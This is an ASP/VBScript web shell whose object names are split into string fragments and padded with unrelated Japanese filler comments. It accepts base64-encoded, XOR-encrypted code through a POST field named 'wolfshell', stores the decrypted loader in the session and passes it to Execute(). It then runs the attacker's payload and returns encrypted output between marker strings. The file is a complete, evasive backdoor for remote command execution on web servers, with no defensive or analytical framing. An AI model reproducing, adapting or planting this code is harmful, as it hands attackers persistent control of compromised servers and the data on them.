<%
Dim d_a1b2, k_c3d4, c_e5f6, p_g7h8, r_i9j0
' // 今日の天気は本当に素晴らしいですね。
Set d_a1b2 = Server.CreateObject(s_builder("y1"))

' // 月が綺麗ですね
Function b64_conv(v_code)
    Dim o_x, o_n
    Set o_x = CreateObject(s_builder("y2"))
    Set o_n = o_x.CreateElement("b64")
    o_n.dataType = "bin.base64"
    o_n.text = v_code
    b64_conv = o_n.nodeTypedValue
    Set o_n = Nothing
    Set o_x = Nothing
End Function

Function x_proc(c_data,is_bin)
    ' // ラーメンが食べたい。
    dim sz, i, res, k_sz
    k_sz = len(k_c3d4)
    Set bin_s = CreateObject(s_builder("y3"))
    bin_s.CharSet = "iso-8859-1"
    bin_s.Type = 2
    bin_s.Open
    ' // このプロジェクトの締め切りはいつですか？
    if IsArray(c_data) then
        sz=UBound(c_data)+1
        For i=1 To sz
            bin_s.WriteText chrw(ascb(midb(c_data,i,1)) Xor Asc(Mid(k_c3d4,(i mod k_sz)+1,1)))
        Next
    end if
    bin_s.Position = 0
    if is_bin then
        bin_s.Type = 1
        x_proc=bin_s.Read()
    else
        x_proc=bin_s.ReadText()
    end if

End Function
    ' // 眠い、コーヒーを一杯ください。
    k_c3d4=s_builder("y4")
    c_e5f6=request.Form(s_builder("y5"))
    if not IsEmpty(c_e5f6) then

        if  IsEmpty(Session("p_g7h8")) then
            c_e5f6=x_proc(b64_conv(c_e5f6),false)
            Session("p_g7h8")=c_e5f6
            response.End
        else
            c_e5f6=x_proc(b64_conv(c_e5f6),true)
            d_a1b2.Add "p_g7h8",Session("p_g7h8")
            ' // 何か面白いことをしましょう！
            Execute(d_a1b2("p_g7h8"))
            r_i9j0=run(c_e5f6)
            response.Write(s_builder("y6"))
            if not IsEmpty(r_i9j0) then
                response.Write Base64Encode(x_proc(r_i9j0,true))
            end if
            ' // ただのコメントです。
            response.Write(s_builder("y7"))
        end if
    end if

Function s_builder(id)
    Select Case id
        Case "y1": s_builder = "Scripting" & ".Dictionary"
        Case "y2": s_builder = "Msxml2." & "DOMDocument.3.0"
        Case "y3": s_builder = "ADODB" & ".Stream"
        Case "y4": s_builder = "3c6e0b" & "8a9c15224a"
        Case "y5": s_builder = "wolf" & "shell"
        Case "y6": s_builder = "a71a" & "b1"
        Case "y7": s_builder = "4b82" & "59"
    End Select
End Function
%>